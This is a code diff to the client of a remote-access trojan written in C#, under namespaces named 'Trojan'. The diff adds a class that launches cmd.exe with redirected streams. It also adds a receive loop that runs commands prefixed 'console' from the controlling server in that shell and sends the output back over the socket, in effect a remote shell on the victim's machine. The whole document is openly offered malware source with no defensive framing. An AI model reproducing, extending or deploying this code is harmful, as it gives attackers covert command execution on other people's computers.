@@ -1,13 +1,47 @@
 ﻿using System;
 using System.Text;
 using System.Net.Sockets;
+using System.Diagnostics;
 using SocketData;
 using Trojan.exceptions;
 
-namespace client
+namespace Trojan.client
 {
     public class Client : SocketHandler
     {
+        public class TCPShell
+        {
+            private Process _ShellProcess = new Process();
+
+            public StreamWriter InputStream;
+            public StreamReader OutputStream;
+            public StreamReader ErrorStream;
+            
+            public TCPShell()
+            {
+                ProcessStartInfo _ShellStartInfo = new ProcessStartInfo();
+
+                _ShellStartInfo.FileName = "cmd.exe";
+                _ShellStartInfo.UseShellExecute = false;
+
+                _ShellStartInfo.RedirectStandardInput = true;
+                _ShellStartInfo.RedirectStandardOutput = true;
+                _ShellStartInfo.RedirectStandardError = true;
+               
+                _ShellProcess.StartInfo = _ShellStartInfo;
+
+                _ShellProcess.Start();
+
+                InputStream = _ShellProcess.StandardInput;
+                OutputStream = _ShellProcess.StandardOutput;
+                ErrorStream = _ShellProcess.StandardError;
+
+                InputStream.Flush();
+                OutputStream.DiscardBufferedData();
+                ErrorStream.DiscardBufferedData();
+            }
+        }
+
         public socketSetup Connector;
 
         public async Task Send_Socket(Socket sock, string message, int SendTimeout)
@@ -16,6 +50,21 @@ namespace client
 
             await sock.SendAsync(Encoding.UTF8.GetBytes(message), SocketFlags.None);
         }
+
+        /*
+        public async Task Send_Socket(Socket sock, StringBuilder message, int SendTimeout)
+        {
+            if (sock == null) throw new ExceptionHandler("[-] Socket can not be null : " + nameof(sock));
+
+            StringBuilder Packetized = new StringBuilder();
+            if (message.Length > BUFFSIZE)
+            {
+                Packetized.AppendLine();
+            }
+
+            await sock.SendAsync(Encoding.UTF8.GetBytes(message), SocketFlags.None);
+        }
+        */
 
         public async Task Receive_Socket(socketSetup socketSetup, int ReceiveTimeout)
         {
@@ -33,15 +82,39 @@ namespace client
                     Console.WriteLine("\n[+] [{0}] Received_MessageFromServer[{1}] -- Message_Length[{2} characters] ;", socketSetup.getUUID(), message, message.Length);
                     socketSetup.buffer = tmpBuffer;
 
-                    string command_parsed = CommandExtension.CheckForCommand(message);
-                    if (command_parsed != "")
+                    if (TruncationCheckCommand(message, 0, 7) != "console")
                     {
-                        string Command_Data = CommandExtension.ExecuteCommand(command_parsed);
-                        await Send_Socket(socketSetup.sock, Command_Data, SEND_TIMEOUT);
+                        string command_parsed = CommandExtension.CheckForCommand(message);
+                        if (command_parsed != "")
+                        {
+                            string Command_Data = CommandExtension.ExecuteCommand(command_parsed);
+                            await Send_Socket(socketSetup.sock, Command_Data, SEND_TIMEOUT);
+                        }
+                        else if (command_parsed == "" && ReceiveTimeout == Timeout.Infinite)
+                        {
+                            await Send_Socket(socketSetup.sock, "\t[|] Command failed " + "[" + message + "]" + " [" + socketSetup.getUUID() + "]", SEND_TIMEOUT);
+                        }
                     }
-                    else if (command_parsed == "" && ReceiveTimeout == Timeout.Infinite)
+                    else
                     {
-                        await Send_Socket(socketSetup.sock, "\t[|] Command failed " + "[" + message + "]" + " [" + socketSetup.getUUID() + "]", SEND_TIMEOUT);
+                        string TCPShell_Command = message.Substring(7);
+
+                        tcpShell.InputStream.WriteLine(TCPShell_Command);
+                        tcpShell.InputStream.WriteLine("<EOF>");
+                        tcpShell.InputStream.Flush();
+
+                        StringBuilder OutputData = new StringBuilder();
+
+                        string? line;
+                        while(true)
+                        {
+                            line = tcpShell.OutputStream.ReadLine();
+                            if (line.EndsWith("<EOF>")) { break; }
+
+                            OutputData.AppendLine("\t" + line);
+                        }
+
+                        await Send_Socket(socketSetup.sock, OutputData.ToString(), SEND_TIMEOUT);
                     }
 
                     if (ReceiveTimeout == Timeout.Infinite) { await Receive_Socket(socketSetup, ReceiveTimeout); }
@@ -63,6 +136,7 @@ namespace client
             }
         }
 
+        public TCPShell tcpShell = new TCPShell();
         public static async Task Main()
         {
             Client client = new Client();
